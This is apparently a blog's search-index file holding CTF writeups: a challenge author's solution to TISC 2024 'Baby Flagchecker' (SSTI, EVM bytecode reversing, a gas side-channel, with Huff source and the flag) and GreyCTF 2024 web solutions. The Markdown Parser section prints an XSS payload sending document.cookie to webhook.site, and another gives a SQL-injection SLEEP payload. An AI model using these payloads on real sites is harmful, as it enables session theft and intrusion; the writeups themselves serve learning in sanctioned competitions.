<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>TISC 2024 - Baby Flagchecker</title>
    <url>/2024/10/16/tisc-2024/</url>
    <content><![CDATA[<p>TISC is a two-week online sequential style CTF competition hosted by CSIT, where participants solve a series of 12 challenges. Over 1300 participants took on the challenges, with the top three levels of challenges having a cash prize pool of $10,000 each to be shared between participants who‚Äôve successfully cleared the respective levels.</p>
<p>I was given the opportunity to create the challenge at level 7, a Web3 reverse engineering&#x2F;binary exploitation challenge. I‚Äôll be sharing the writeup, as well as source code and my thoughts, at the end of the blog post. You can check out the <a href="https://www.csit.gov.sg/events/tisc/tisc-2024">statistics for the ctf here</a>. 17 people managed to solve my challenge; thank you friends.</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote>
<p>üìò Challenge description:<br>While scanning their network, you chance upon a tool that checks for the validity of a secret passphrase. You know that they use this phrase for establishing communications between one another, but the one you have is way outdated.<br>It‚Äôs time for an update.</p>
</blockquote>
<p><a href="https://github.com/Iscaraca/CTF-Challenges/tree/main/tisc2024/baby_flagchecker">Link to source code (including setup files, files given to the participants, and solution script)</a></p>
<p>The website is stupid simple. It‚Äôs just one text input with a submit button, and if your passphrase isn‚Äôt correct, ‚ÄúInvalid‚Äù is flashed on the screen. Participants don‚Äôt actually know what‚Äôs displayed when the passphrase is correct so we‚Äôll leave that as a surprise for later. </p>
<p><img src="/2024/10/16/tisc-2024/page.png" alt="page"></p>
<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><p>SSTI to information leak to side channel attack via gas usage</p>
<h3 id="NLDR-Not-long-did-read-Stage-1-SSTI-to-information-leak"><a href="#NLDR-Not-long-did-read-Stage-1-SSTI-to-information-leak" class="headerlink" title="NLDR (Not long did read) - Stage 1: SSTI to information leak"></a>NLDR (Not long did read) - Stage 1: SSTI to information leak</h3><p>Trivially, the input is vulnerable to SSTI. Using standard CTF techniques to enumerate the machine and achieve RCE will be futile as the only instance of the flag is stored on the private blockchain network. Also, there‚Äôs a WAF that blocks strings more than 32 characters long. This length check was honestly so I didn‚Äôt have to deal with any ABI shenanigans when calling the contract, but I‚Äôm glad it had the unintended effect of discouraging people from going down the SSTI rabbit hole.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(password) &gt; <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">                &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;title&gt;Check Result&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;body&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Keyphrase too long!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Rest of endpoint here</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        ...</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>, response_data=response_data)</span><br></pre></td></tr></table></figure>


<p>Looking at <code>app/main.py</code>, we can see that the whole of <code>response_data</code> is passed into Jinja‚Äôs context instead of just the output. The object format can be seen in <code>server/connect_to_testnet.py</code>:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;output&quot;</span><span class="punctuation">:</span> output<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;contract_address&quot;</span><span class="punctuation">:</span> setup_contract.address<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;setup_contract_bytecode&quot;</span><span class="punctuation">:</span> os.environ<span class="punctuation">[</span>&#x27;SETUP_BYTECODE&#x27;<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;adminpanel_contract_bytecode&quot;</span><span class="punctuation">:</span> os.environ<span class="punctuation">[</span>&#x27;ADMINPANEL_BYTECODE&#x27;<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secret_contract_bytecode&quot;</span><span class="punctuation">:</span> os.environ<span class="punctuation">[</span>&#x27;SECRET_BYTECODE&#x27;<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;gas&quot;</span><span class="punctuation">:</span> gas</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>We can leak all this information using the payload <code>&#123;&#123; response_data &#125;&#125;</code>.</p>
<h2 id="Stage-2-Reverse-engineering-the-smart-contract-bytecode"><a href="#Stage-2-Reverse-engineering-the-smart-contract-bytecode" class="headerlink" title="Stage 2: Reverse engineering the smart contract bytecode"></a>Stage 2: Reverse engineering the smart contract bytecode</h2><p>From the previous stage, we get:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;output&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> </span><br><span class="line">&#x27;setup_contract_address&#x27;<span class="punctuation">:</span> &#x27;<span class="number">0x5FC8d32690cc91D4c39d9d3abcBD16989F875707</span>&#x27;<span class="punctuation">,</span> </span><br><span class="line">&#x27;setup_contract_bytecode&#x27;<span class="punctuation">:</span> &#x27;<span class="number">0x608060405234801561001057600080fd5b5060405161027838038061027883398101604081905261002f9161007c565b600080546001600160a01b039384166001600160a01b031991821617909155600180549290931691161790556100af565b80516001600160a01b038116811461007757600080fd5b919050565b6000806040838503121561008f57600080fd5b61009883610060565b91506100a660208401610060565b90509250929050565b6101ba806100be6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063410eee0214610030575b600080fd5b61004361003e366004610115565b610057565b604051901515815260200160405180910390f35b6000805460015460408051602481018690526001600160a01b0392831660448083019190915282518083039091018152606490910182526020810180516001600160e01b0316635449534360e01b17905290518493849316916100b99161012e565b6000604051808303816000865af19150503d80600081146100f6576040519150601f19603f3d011682016040523d82523d6000602084013e6100fb565b606091505b50915091508061010a9061015d565b600114949350505050565b60006020828403121561012757600080fd5b5035919050565b6000825160005b8181101561014f5760208186018101518583015201610135565b506000920191825250919050565b8051602080830151919081101561017e576000198160200360031b1b821691505b5091905056fea2646970667358221220e0f8333be083b807f8951d4868a6231b41254b2f6157a9fb62eff1bcefafd84e64736f6c63430008130033</span>&#x27;<span class="punctuation">,</span> </span><br><span class="line">&#x27;adminpanel_contract_bytecode&#x27;<span class="punctuation">:</span> &#x27;<span class="number">0x60858060093d393df35f358060d81c64544953437b148160801b60f81c607d1401600214610022575f5ffd5b6004356098636b35340a6060526020606020901b186024356366fbf07e60205260205f6004603c845af4505f515f5f5b82821a85831a14610070575b9060010180600d146100785790610052565b60010161005e565b81600d1460405260206040f3</span>&#x27;<span class="punctuation">,</span> </span><br><span class="line">&#x27;secret_contract_bytecode&#x27;<span class="punctuation">:</span> &#x27;<span class="number">0</span>xREDACTED&#x27;<span class="punctuation">,</span> </span><br><span class="line">&#x27;gas&#x27;<span class="punctuation">:</span> <span class="number">29307</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>There are 3 contracts deployed to the network: <code>Setup</code>, <code>AdminPanel</code>, and <code>Secret</code>. <code>Secret</code>‚Äòs bytecode has been redacted, probably because it contains the keyphrase. We still have the bytecode from the other two contracts, however, and can see how our keyphrase is being checked.</p>
<p>Before going into reverse engineering, we can get a better idea of <code>Setup</code> by looking at the server files provided, giving us a better place to start.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">uint256 deployerPrivateKey = DEPLOYER_PRIVATE_KEY;</span><br><span class="line">vm.startBroadcast(deployerPrivateKey);</span><br><span class="line">Setup setup = new Setup(address(adminPanel), address(secret));</span><br><span class="line">console2.log(<span class="string">&quot;Setup contract deployed to: &quot;</span>, address(setup));</span><br><span class="line">vm.stopBroadcast();</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># server/contracts/script/Deploy.s.sol</span></span><br><span class="line">passwordEncoded = <span class="string">&#x27;0x&#x27;</span> + <span class="built_in">bytes</span>(password.ljust(<span class="number">32</span>, <span class="string">&#x27;\0&#x27;</span>), <span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gas = setup_contract.functions.checkPassword(passwordEncoded).estimate_gas()</span><br><span class="line">    output = setup_contract.functions.checkPassword(passwordEncoded).call()</span><br></pre></td></tr></table></figure>


<p><code>Setup</code>‚Äòs constructor function takes in two addresses, that of <code>AdminPanel</code> and <code>Secret</code>. It has another external function <code>checkPassword(bytes32)</code> that takes in the keyphrase and outputs a boolean.</p>
<p>We can pass <code>Setup</code>‚Äòs bytecode into any Ethereum Virtual Machine decompiler (this writeup uses free and publically available decompilers like <a href="https://onchainplay.fly.dev/">heimdall</a> and <a href="https://app.dedaub.com/decompile">dedaub</a>, but if you want to look at the disassembly that‚Äôs fine too, the contracts in this challenge are really small) and look at the output. Since the bytecode includes the constructor, only the deployment code appears at first:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint160 ___function_selector__; // STORAGE[0x0] bytes 0 to 19</span><br><span class="line">uint160 stor_1_0_19; // STORAGE[0x1] bytes 0 to 19</span><br><span class="line"></span><br><span class="line">function function_selector() public payable &#123; </span><br><span class="line">    ...</span><br><span class="line">    ___function_selector__ = MEM[MEM[64]];</span><br><span class="line">    stor_1_0_19 = MEM[MEM[64] + 32];</span><br><span class="line">    MEM[0:442] = 0x6080...;</span><br><span class="line">    return MEM[0:442];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>We see the addresses of <code>AdminPanel</code> and <code>Secret</code> saved into EVM storage, and some bytecode getting returned from the function. This will be the deployed bytecode of <code>Setup</code> where our <code>checkPassword</code> function is. We can copy the string and decompile it once more:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 store_b;</span><br><span class="line">bytes32 store_a;</span><br><span class="line"></span><br><span class="line">function Unresolved_410eee02(uint256 arg0) public payable returns (bool) &#123;</span><br><span class="line">    uint256 var_a = arg0;</span><br><span class="line">    address var_b = address(store_a);</span><br><span class="line">    uint256 var_c = 0x44 + (var_d - var_d);</span><br><span class="line">    uint256 var_d = var_d + 0x64;</span><br><span class="line">    uint224 var_e = 0x5449534300000000000000000000000000000000000000000000000000000000 | (uint224(var_f));</span><br><span class="line">    uint256 var_g = 0;</span><br><span class="line">    (bool success, bytes memory ret0) = address(store_b).call&#123; gas: gasleft(), value: var_g &#125;(abi.encode());</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>bytes32 store_b</code> is <code>AdminPanel</code>‚Äòs address, and <code>bytes32 store_a</code> is <code>Secret</code>‚Äòs. Function <code>Unresolved_410eee02</code> is almost certainly <code>checkPassword</code>, and our keyphrase is being passed in as <code>arg0</code>. A call is being done on a function in <code>AdminPanel</code> using solidity‚Äôs ABI specification, which you can read <a href="https://docs.soliditylang.org/en/latest/abi-spec.html">here</a>. Knowing how the ABI works is pretty much the crux of this stage since the AdminPanel contract has been obfuscated with a non-standard function selector and calldata retrieval method. Details of the CALL instruction are as follows:</p>
<table>
<thead>
<tr>
<th>Stack Input</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>gas</td>
<td>Amount of gas to send to the sub context to execute. The gas that is not used by the sub context is returned to this one.</td>
</tr>
<tr>
<td>address</td>
<td>The account whose context to execute.</td>
</tr>
<tr>
<td>value</td>
<td>Value in wei to send to the account.</td>
</tr>
<tr>
<td>argsOffset</td>
<td>Byte offset in the memory in bytes, the calldata of the sub context.</td>
</tr>
<tr>
<td>argsSize</td>
<td>Byte size to copy (size of the calldata).</td>
</tr>
<tr>
<td>retOffset</td>
<td>Byte offset in the memory in bytes, where to store the return data of the sub context.</td>
</tr>
<tr>
<td>retSize</td>
<td>Byte size to copy (size of the return data).</td>
</tr>
</tbody></table>
<p>In the evm, when a call is made to a smart contract, both the function to call and its arguments are passed as one long bytestring referred to as <code>args</code>. The first 4 bytes of this bytestring are reserved for the function signature, which specifies the function to call within the contract. All data after the signature are the function arguments, and each argument takes exactly 32 bytes. This is, of course, assuming that the contract was compiled with these standards in mind. The <code>AdminPanel</code> contract was not.</p>
<p>Let‚Äôs reverse engineer it along with <code>Setup</code> to help us understand how the call is done. Removing the constructor and decompiling is finnicky with most online tools (as the instructions were written manually), but luckily this contract is tiny and the disassembly is a mere 88 instructions long (as the instructions were written manually). Simply referring to the <a href="https://www.evm.codes/">evm opcode reference</a> and tracing the stack is enough to debug most problematic decompiler outputs and give you this function:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function (bytes4 function_signature, uint256 varg1, uint256 varg2) public payable &#123; </span><br><span class="line">    require(0x544953437B == args[0:5]);</span><br><span class="line">    require(0x7D == args[16]);</span><br><span class="line">    v0 = varg2.delegatecall(0x66fbf07e).gas(msg.gas);</span><br><span class="line">    i = num_of_chars_correct = 0;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        if ((keccak256(0x6b35340a) &lt;&lt; 152 ^ varg1)[v1] == v0[v1]) &#123;</span><br><span class="line">            num_of_chars_correct += 1;</span><br><span class="line">        &#125;</span><br><span class="line">        i += 1;</span><br><span class="line">        if (i == 13) &#123;</span><br><span class="line">            return num_of_chars_correct == 13;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>It‚Äôs apparent that this function is doing a character-by-character comparison of two strings. The first string is the first argument to the function XORed with some key, and the second is the result of a delegatecall to the contract at the address specified by our second argument. Cross-referencing the <code>Setup</code> contract, it‚Äôs clear that the second argument is the address to the <code>Secret</code> contract, and the first is our submitted keyphrase. Note that there are also checks on the <code>args</code> bytestring as a whole at the start of the function</p>
<p>The <code>args</code> used to call <code>AdminPanel</code> would therefore have to look something like this:</p>
<table>
<thead>
<tr>
<th>Size</th>
<th>Data</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>4 bytes</td>
<td>0x54495343</td>
<td>Function signature</td>
</tr>
<tr>
<td>32 bytes</td>
<td>0x7B??????????????????????7D000000‚Ä¶</td>
<td>Keyphrase</td>
</tr>
<tr>
<td>32 bytes</td>
<td>0x????‚Ä¶</td>
<td>Address of Secret contract</td>
</tr>
</tbody></table>
<p>Chaining all these arguments together into the ABI encoded bytestring, we get:</p>
<p><code>0x544953437B??????????????????????7D0000...??????...</code></p>
<p>Note how the function signature and the keyphrase form a contiguous section that decodes to <code>TISC&#123;???????????&#125;</code>. This is obviously the flag, but we can‚Äôt look at the <code>Secret</code> contract to see what its being compared to. What now?</p>
<h2 id="Stage-3-Side-channel-attack-using-calculated-gas-estimate"><a href="#Stage-3-Side-channel-attack-using-calculated-gas-estimate" class="headerlink" title="Stage 3: Side channel attack using calculated gas estimate"></a>Stage 3: Side channel attack using calculated gas estimate</h2><p>This premise, combined with the odd character-by-character comparison between the strings instead of using the EQ instruction, intuitively tells us that there‚Äôs some form of blind attack we need to find some side channel for, but coming up with a definite solution is tricky. The key thing to note here is how the evm calculates gas prices for each transaction.</p>
<p>When you make a transaction or call a function, there are gas fees involved that are paid to the validators. How this gas fee is calculated is based on the evm instructions ran per transaction. Each opcode corresponds to a set gas value, and throughout the execution of the code, these gas values are tallied up to give a numerical estimate for the computational cost of the transaction. This number is then multiplied by the current cost of gas to get the final fee.</p>
<p>In the debugging information we managed to leak earlier, we can see the total gas value our transaction has used. The interesting thing about this value is that it changes based on the path the transaction takes down the control flow of the program, as the number of instructions ran through varies. We can use this idea to do a side-channel attack using the gas value as our metric.</p>
<p>When a successful character comparison is done, the control flow deviates and runs one extra line of code:</p>
<p><code>num_of_chars_correct += 1;</code></p>
<p>In the disassembly output, this deviation corresponds to these instructions:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x70: JUMPDEST  	    1 gas</span><br><span class="line">0x71: PUSH1     0x1	    3 gas</span><br><span class="line">0x73: ADD       	    3 gas</span><br><span class="line">0x74: PUSH2     0x5e	3 gas</span><br><span class="line">0x77: JUMP		        8 gas</span><br></pre></td></tr></table></figure>


<p>which adds up to 18 gas total. This means that for every correct character in our keyphrase, the gas value will increase by 18. Submitting</p>
<p><code>&#123;00000000000&#125;&#123;&#123; response_data &#125;&#125;</code></p>
<p>and reading the gas value gives us 33365, but submitting</p>
<p><code>&#123;g0000000000&#125;&#123;&#123; response_data &#125;&#125;</code></p>
<p>gives us a value of 33383, telling us that our flag starts with g. We can do the same to all the characters in the flag with the script in <code>solve.py</code> to get the flag!</p>
<p><code>TISC&#123;g@s_Ga5_94S&#125;</code></p>
<h2 id="Thoughts"><a href="#Thoughts" class="headerlink" title="Thoughts"></a>Thoughts</h2><p>I came up with the idea of doing a gas side channel attack in my sleep. </p>
<p>I was stressed the hell out coming up with an idea to best all other previous CTF challenges I‚Äôve made thus far (and I‚Äôll be the first to say they‚Äôre all really good challenges), and I was convinced that EVM was the way to go since I‚Äôd been doing so much research into it lately, but nothing really clicked. I tried making an EVM pwn before this, but I had to do so many weird things that people wouldn‚Äôt normally do to make a pointer overwrite possible, and I don‚Äôt like it when CTF challenges just do the most unbelievable things that no sane developer would do just to get a point across.</p>
<p>It was a real eureka moment for me, using the gas estimate as a means to count instructions. I don‚Äôt think I‚Äôve seen this exploit being documented online before (partially because not a lot of people deploy contracts to private networks), and it was a good opportunity to introduce the concept of the evm and gas calculations to participants. I was so excited (ask anyone in the office on that day) since I had been struggling on a challenge idea for literal weeks.</p>
<h2 id="Making-the-challenge"><a href="#Making-the-challenge" class="headerlink" title="Making the challenge"></a>Making the challenge</h2><p>If you look at the contracts‚Äô source code, you‚Äôll notice that instead of solidity, they‚Äôre written in an evm-level language called Huff. I‚Äôll put the contract code here for convenience:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* AdminPanel.huff */</span><br><span class="line">/* Interface */</span><br><span class="line">#define function checkPassword(address,bytes32) nonpayable returns (bytes32)</span><br><span class="line"></span><br><span class="line">/* Methods */</span><br><span class="line">#define macro CHECK_PASSWORD() = takes (0) returns (5) &#123;</span><br><span class="line">    0x04 calldataload           // [password]</span><br><span class="line"></span><br><span class="line">    // XOR with secret key      </span><br><span class="line">    0x98                        // [length, plaintext]</span><br><span class="line">    0x6b35340a 0x60 mstore      // [length, plaintext]</span><br><span class="line">    0x20 0x60 sha3              // [hash, length, plaintext]</span><br><span class="line">    swap1 shl xor               // [xoredPlaintext]</span><br><span class="line"></span><br><span class="line">    0x24 calldataload           // [secretAddr, password]</span><br><span class="line"></span><br><span class="line">    // Store function signature in memory</span><br><span class="line">    0x66fbf07e 0x20 mstore</span><br><span class="line"></span><br><span class="line">    // Retrieve password from external contract</span><br><span class="line">    0x20 0x00 0x04 0x3C dup5 gas delegatecall</span><br><span class="line"></span><br><span class="line">    pop 0x00 mload              // [secret, secretAddr, password]</span><br><span class="line"></span><br><span class="line">    // Push itercount and correctCount to the stack</span><br><span class="line">    0x00 0x00                   // [correctCount, itercount, secret, secretAddr, password]</span><br><span class="line"></span><br><span class="line">    iterativeCheck:</span><br><span class="line">        dup3 dup3 byte          // [secretNth, correctCount, itercount, secret, secretAddr, password]</span><br><span class="line">        dup6 dup4 byte          // [flagNth, secretNth, correctCount, itercount, secret, secretAddr, password]</span><br><span class="line">        eq correctChar jumpi    // [correctCount, itercount, secret, secretAddr, password]</span><br><span class="line"></span><br><span class="line">    iterativeCheckAfterJump:</span><br><span class="line">        swap1 0x01 add          // [itercount++, correctCount, secret, secretAddr, password]</span><br><span class="line">        dup1 0x0D eq end jumpi  // [itercount, correctCount, secret, secretAddr, password]</span><br><span class="line">        swap1                   // [correctCount, itercount, secret, secretAddr, password]</span><br><span class="line">        iterativeCheck jump</span><br><span class="line"></span><br><span class="line">    correctChar:</span><br><span class="line">        0x01 add                // [correctCount++, itercount, secret, secretAddr, password]</span><br><span class="line">        iterativeCheckAfterJump jump</span><br><span class="line"></span><br><span class="line">    end:</span><br><span class="line">        dup2 0x0D eq            // [correct?, itercount, correctCount, secret, secretAddr, password]</span><br><span class="line">        0x40 mstore             // [itercount, correctCount, secret, secretAddr, password]</span><br><span class="line">    </span><br><span class="line">    0x20 0x40 return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#define macro MAIN() = takes (0) returns (1) &#123;</span><br><span class="line">    // Check for flag format</span><br><span class="line">    0x00 calldataload           // [&quot;TISC&#123;###########&#125;&quot;]</span><br><span class="line">    </span><br><span class="line">    dup1 0xD8 shr               // [&quot;TISC&#123;&quot;, &quot;TISC&#123;###########&#125;&quot;]</span><br><span class="line">    0x544953437B eq             // [1, &quot;TISC&#123;###########&#125;&quot;]</span><br><span class="line">    dup2 0x80 shl 0xF8 shr      // [&quot;&#125;&quot;, 1, &quot;TISC&#123;###########&#125;&quot;]</span><br><span class="line">    0x7D eq                     // [1, 1, &quot;TISC&#123;###########&#125;&quot;]</span><br><span class="line">    add 0x02 eq checkPassword jumpi</span><br><span class="line"></span><br><span class="line">    0x00 0x00 revert</span><br><span class="line"></span><br><span class="line">    checkPassword:</span><br><span class="line">        CHECK_PASSWORD()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Secret.huff */</span><br><span class="line">/* Interface */</span><br><span class="line">#define function secretP1ssp00r() nonpayable returns (bytes32)</span><br><span class="line"></span><br><span class="line">/* Methods */</span><br><span class="line">#define macro SECRET_P1SSP00R() = takes (0) returns (0) &#123;</span><br><span class="line">    // Store &quot;&#123;g@s_Ga5_94S&#125;&quot; encrypted in memory for return</span><br><span class="line">    0xDEAF50391118A37595C50AC9F700000000000000000000000000000000000000 0x00 mstore</span><br><span class="line"></span><br><span class="line">    // End Execution</span><br><span class="line">    0x20 0x00 return </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#define macro MAIN() = takes (0) returns (0) &#123;</span><br><span class="line">    // Identify which function is being called.</span><br><span class="line">    0x00 calldataload 0xE0 shr</span><br><span class="line">    dup1 __FUNC_SIG(secretP1ssp00r) eq secretP1ssp00r jumpi</span><br><span class="line"></span><br><span class="line">    0x00 0x00 revert</span><br><span class="line"></span><br><span class="line">    secretP1ssp00r:  // So that people cant find this on 4 byte signature databases</span><br><span class="line">        SECRET_P1SSP00R()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>The reason for this is that I was running out of time to submit the challenge, so I couldn‚Äôt draft an applicable control flow graph that solidity would compile to before the deadline. Because of this, I chose to implement the most textbook example of a function vulnerable to side channel attacks, which involved writing the instructions manually in huff since I didn‚Äôt have time to deal with compiler shenanigans.</p>
<p>Next time I make this challenge, it‚Äôll be a huge CFG with multiple paths so you actually have to do some math to arrive at the solution.</p>
]]></content>
      <categories>
        <category>CTF Writeups</category>
      </categories>
      <tags>
        <tag>Challenge Creation</tag>
      </tags>
  </entry>
  <entry>
    <title>GreyCTF 2024 Writeups</title>
    <url>/2024/04/21/greyctf-2024/</url>
    <content><![CDATA[<p>I participated under team <strong>youtiaos</strong> and we ended 1st place local.</p>
<p><img src="/2024/04/21/greyctf-2024/scoreboard.png" alt="scoreboard"></p>
<p>I was solving in the web and misc categories. The specific challenges I solved are in the image below.</p>
<p><img src="/2024/04/21/greyctf-2024/challenges.png" alt="challenges"></p>
<p>I‚Äôll update this writeup with the flags once the challenges are back up.</p>
<h1 id="Web-Challenges"><a href="#Web-Challenges" class="headerlink" title="Web Challenges"></a>Web Challenges</h1><h2 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h2><p>The website uses Flask session cookies but the secret key is given unchanged in the source code. Sign another cookie with <code>is_admin=True</code> and proceed to spend 10 minutes finding for a hidden element on the admin page to get the flag. </p>
<h2 id="GreyCTF-Survey"><a href="#GreyCTF-Survey" class="headerlink" title="GreyCTF Survey"></a>GreyCTF Survey</h2><p>The form limits the user submitted survey score using <code>vote &lt; 1 &amp;&amp; vote &gt; -1</code>, and calls <code>parseInt(vote)</code> in an effort to ‚Äúround‚Äù all votes to 0. Javascript‚Äôs <code>parseInt</code> is awful at handling small decimal numbers as per <a href="https://priyankuhazarika.hashnode.dev/weird-javascript-the-strange-behaviour-of-parseint">this article</a>. We can submit a small enough decimal number and get the flag. </p>
<h2 id="Markdown-Parser"><a href="#Markdown-Parser" class="headerlink" title="Markdown Parser"></a>Markdown Parser</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">lines.<span class="title function_">forEach</span>(<span class="function"><span class="params">line</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (inCodeBlock) &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;```&#x27;</span>)) &#123;</span><br><span class="line">                inCodeBlock = <span class="literal">false</span>;</span><br><span class="line">                htmlOutput += <span class="string">&#x27;&lt;/code&gt;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                htmlOutput += <span class="title function_">escapeHtml</span>(line) + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;```&#x27;</span>)) &#123;</span><br><span class="line">                language = line.<span class="title function_">substring</span>(<span class="number">3</span>).<span class="title function_">trim</span>();</span><br><span class="line">                inCodeBlock = <span class="literal">true</span>;</span><br><span class="line">                htmlOutput += <span class="string">&#x27;&lt;pre&gt;&lt;code class=&quot;language-&#x27;</span> + language + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(htmlOutput);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                line = <span class="title function_">escapeHtml</span>(line);</span><br><span class="line">                ...  <span class="comment">// More escaping</span></span><br><span class="line">                htmlOutput += line;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>For some reason the parser ignores anything on the line of the code block quotes. We can take advantage of this by injecting an element that can steal cookies on Chromium browsers.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">```python&quot;&gt;asss<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;document.location=&#x27;https://webhook.site/???/?c=&#x27;+document.cookie&quot;</span> <span class="attr">href</span>=<span class="string">&quot;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Fearless-Concurrency"><a href="#Fearless-Concurrency" class="headerlink" title="Fearless Concurrency"></a>Fearless Concurrency</h2><p>The application leaks the user secret by creating a table with a randomised name, performing an SQL injectable query, and dropping the table right after. To give us enough time to extract the table name, we‚Äôll have to inject a <code>SLEEP(n)</code> into the query so that the application doesn‚Äôt drop our table.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">H<span class="operator">%</span><span class="string">&#x27; AND SLEEP(7); -- </span></span><br></pre></td></tr></table></figure>

<p>Now we need to use blind SQL injection to extract our table name, but the user we slept on cannot be used as the application assigns a mutex to each user that is acquired on performing any database operation:</p>
<figure class="highlight rs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> User &#123;</span><br><span class="line">        User &#123;</span><br><span class="line">            lock: Arc::<span class="title function_ invoke__">new</span>(Mutex::<span class="title function_ invoke__">new</span>(())),</span><br><span class="line">            secret: rand::random::&lt;<span class="type">u32</span>&gt;()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>However, since this is per-user, we can simply register another user and extract from there. Since we know our previous user‚Äôs id, all we need now is to brute force the randomly generated <code>table_id</code> with a search space of <code>u32</code>.</p>
